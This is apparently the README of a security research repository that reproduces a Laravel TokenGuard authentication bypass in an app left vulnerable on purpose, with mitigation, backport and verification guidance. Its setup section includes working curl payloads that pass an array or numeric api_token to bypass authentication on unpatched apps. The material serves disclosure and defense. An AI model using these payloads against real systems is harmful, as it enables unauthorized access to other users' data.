# Laravel TokenGuard Authentication Bypass (GHSA-f9x3-7vq9-cph6)

[日本語](README.ja.md) · [Detailed analysis](docs/analysis.md)

**An attacker without a valid token may be able to bypass API authentication and retrieve another user’s information.** This issue affects Laravel's legacy token authentication guard, `Illuminate\Auth\TokenGuard` ([GHSA-f9x3-7vq9-cph6](https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6)).

Start by checking your app's `config/auth.php`. **If a guard uses `'driver' => 'token'` and protects your API routes, check whether your app is affected.** Authentication may be bypassed when `hash` is `false` or omitted and the app uses Eloquent with MySQL/MariaDB. See [the configuration check below](#1-are-you-affected-about-1-minute) for the conditions and what to do.

On Laravel 5.6–10.x, `composer audit` or Dependabot may not report this issue. Check your configuration even if neither tool reports it.

This repository provides reproductions for Laravel `v5.6.40` and `v8.5.0` so you can observe the issue and verify the fix.

## Running this repository

This is a legacy Laravel 8.5 app (PHP 7.4, MySQL), so it ships with its own `docker-compose.yml` rather than Sail's defaults.

```bash
cp .env.example .env
docker compose build
docker compose up -d
docker compose exec -u sail laravel.test composer install --prefer-dist --no-interaction
docker compose exec -u sail laravel.test php artisan key:generate
docker compose exec -u sail laravel.test php artisan migrate --seed
```

This seeds a demo user (`demo@example.com` / `password`) alongside 9 random users. The app is now at `http://localhost:8000` (change `APP_PORT` in `.env` if 8000 is taken).

No login, no token, no credentials — send an array-valued `api_token` straight at a protected route:

```bash
curl -sS -G http://localhost:8000/api/user -H 'Accept: application/json' \
  --data-urlencode 'api_token[]=x'
```

No patch is registered by default, so `TokenGuard::user()` runs unmodified and the array is passed straight through to `hash()` and `EloquentUserProvider`. With the default `hash => true`, this produces HTTP 500 (see below) rather than being rejected earlier in the stack — one unauthenticated request is enough to confirm the array input reaches the guard.

Now log in and fetch a token, needed for the normal-authentication check and to seed a stored `api_token` for the bypass test below:

```bash
curl -s -X POST http://localhost:8000/api/login \
  -H 'Content-Type: application/json' -H 'Accept: application/json' \
  -d '{"email":"demo@example.com","password":"password"}'
```

Check normal authentication using the `access_token` returned by login (with the default `hash => true`):

```bash
curl -i http://localhost:8000/api/user -H 'Accept: application/json' \
  -H 'Authorization: Bearer <access_token>'
```

Then submit a JSON array containing a number. The query string `api_token[]=0` produces an array of strings, so it does not reproduce this numeric comparison.

```bash
curl -i -X GET http://localhost:8000/api/user \
  -H 'Content-Type: application/json' -H 'Accept: application/json' \
  -d '{"api_token":[0]}'
```

With the unpatched guard, HTTP 500 has been observed with `hash => true`. Change `guards.api.hash` in `config/auth.php` to `false`, run `php artisan config:clear` inside the container, and repeat the request: authentication can be bypassed if a stored token matches the numeric comparison. The result depends on the stored values. All initially seeded `api_token` values are `null`, so log in first to store a token. Changing `hash` alone does not require rerunning Composer.

### ✅ Apply the fix and confirm it works

So far, everything above ran **unpatched**: HTTP 500 with `hash => true`, and an authentication bypass (HTTP 200) with `hash => false`. Now apply `patches/tokenguard-is-string-fix.patch` — the exact two-line backport from [Fix](#2-fix) below — and confirm the same attack no longer works.

Register `patches/tokenguard-is-string-fix.patch` under `extra.patches.laravel/framework` in `composer.json`, then reinstall the framework and clear the configuration cache:

```bash
docker compose exec -u sail laravel.test composer reinstall laravel/framework --prefer-dist --no-interaction
docker compose exec -u sail laravel.test php artisan config:clear
```

| | Before the fix | After the fix |
|-|-|-|
| Array sent with `hash => true` | HTTP 500 (exception) | **HTTP 401** (rejected by the type check) |
| Array sent with `hash => false` | HTTP 200 (auth bypass) | **HTTP 401** (never reaches the database) |

Resend the same `{"api_token":[0]}` request under both `hash => true` and `hash => false`: both should now return HTTP 401, and the request should never reach `EloquentUserProvider`'s query. The login handler stores hashed tokens, so restore `hash => true` and clear the configuration cache when checking normal token authentication.

Tear down with `docker compose down -v` (the `-v` also removes the MySQL data volume).

## 1. Are you affected? (about 1 minute)

```bash
php artisan route:list | grep 'auth:'        # routes using auth:api or similar
grep -rn "'driver' => 'token'" config/       # guards using the legacy TokenGuard
grep -rn "TokenGuard" app/ config/           # custom guards copying or overriding it
```

If a guard uses `'driver' => 'token'`, look at its `hash` option:

```php
'api' => [
    'driver' => 'token',
    'provider' => 'users',
    'hash' => false,   // or omitted: older TokenGuard treats a missing hash as false
],
```

| What you find | What to do |
|-|-|
| No `token`-driver guard (e.g. Sanctum only) | Not affected by this issue. |
| `token` driver, `hash => false` or omitted, reachable routes, Eloquent provider, MySQL/MariaDB | **Treat as vulnerable. Fix now.** |
| `token` driver, `hash => true` | Not a fix. The HTTP 500 is an incidental barrier and `validate()` still lacks the type check. **Apply the fix.** |
| Custom guard copying `TokenGuard::user()` / `validate()` | Inspect it separately. Updating the framework will not repair a copy. |

Caveats: `auth:api` alone proves nothing, since `api` may be Sanctum, and `TokenGuard` may be registered under another guard name. A grep match means "look closer", not "exploitable". Exposure also depends on the database and stored values.

**Using Laravel 8 (or upgrading to a newer major) does not by itself fix this.** `TokenGuard` was not removed or changed in 9–13; an app that already had a `token` guard carries it forward. Only the `laravel/laravel` skeleton stopped generating that guard (from 8.6.0).

### Why a clean audit is not enough

The advisory's structured version data only covers `laravel/framework` `< 13.29.0` and `< v12.68.0`, yet the vulnerable code has been present, unchanged, since 5.6. Running `composer audit` against this repository's `v5.6.40` and `v8.5.0` lockfiles reported unrelated advisories, but not this one. For Laravel 5.6–10.x, the absence of a report from `composer audit` or Dependabot does not establish that your app is unaffected.

## 2. Fix

### Supported lines: upgrade

| Laravel | Fixed in |
|-|-|
| 11 | **11.56.1** |
| 12 | **12.68.0** |
| 13 | **13.29.0** |

### End-of-life lines (5.6–10): backport both checks

5.6 through 10 will never receive an official fix. If you cannot upgrade, apply **both** changes to `Illuminate\Auth\TokenGuard`:

```diff
 // user()
- if (! empty($token)) {
+ if (is_string($token) && ! empty($token)) {
```

```diff
 // validate()
- if (empty($credentials[$this->inputKey])) {
+ if (! is_string($credentials[$this->inputKey] ?? null) || empty($credentials[$this->inputKey])) {
```

* No need to change token storage from hashed to plaintext.
* Do not hand-edit `vendor/`; Composer will overwrite it. Keep a reproducible patch (this repository does it with [`cweagans/composer-patches`](https://github.com/cweagans/composer-patches), see [patch management](docs/analysis.md#how-this-repository-manages-patches)) or a registered custom guard, and add regression tests.
* This fixes **this bypass only**. It does not restore security support to an EOL release.

## 3. Verify

* A valid token still authenticates.
* No token returns HTTP 401 on a protected route.
* A non-string token returns HTTP 401, not an authenticated user and not HTTP 500.
* The invalid token never reaches the user provider's database lookup.
* Custom code paths that call `TokenGuard::validate()` are covered by tests.

## About this repository

A Laravel 8.5 application (the last skeleton that scaffolds the `token` guard) kept for local reproduction. Branches: `main` and `laravel-8.5` (8.5.0), `laravel-5.6` (5.6.40, the first affected version).

> [!WARNING]
> **Local security research and education only. Never deploy this or expose it to the internet.** Its authentication setup is intentionally insecure. Use disposable data and systems you own or are authorized to test.
>
> **No patch is registered by default.** The app runs the unpatched `TokenGuard::user()` as-is, so the vulnerable behavior described below is live out of the box. Registering the real fix patch is covered in the [analysis](docs/analysis.md#how-this-repository-manages-patches).

## Learn more

[**Detailed analysis**](docs/analysis.md): root cause, observed results with `hash` true/false, how far back it goes (5.5 is not affected, 5.6 is the first affected version), support-policy coverage, and the scanner gap in detail.

## References

* [GitHub Security Advisory — GHSA-f9x3-7vq9-cph6](https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6)
* [Laravel 8.5.0 `TokenGuard.php`](https://github.com/laravel/framework/blob/v8.5.0/src/Illuminate/Auth/TokenGuard.php)
* [Laravel 8.5.0 `EloquentUserProvider.php`](https://github.com/laravel/framework/blob/v8.5.0/src/Illuminate/Auth/EloquentUserProvider.php)
* [Laravel 11.56.1 `TokenGuard.php` (patched)](https://github.com/laravel/framework/blob/v11.56.1/src/Illuminate/Auth/TokenGuard.php)
* [Laravel support policy](https://github.com/laravel/docs/blob/13.x/releases.md#support-policy)
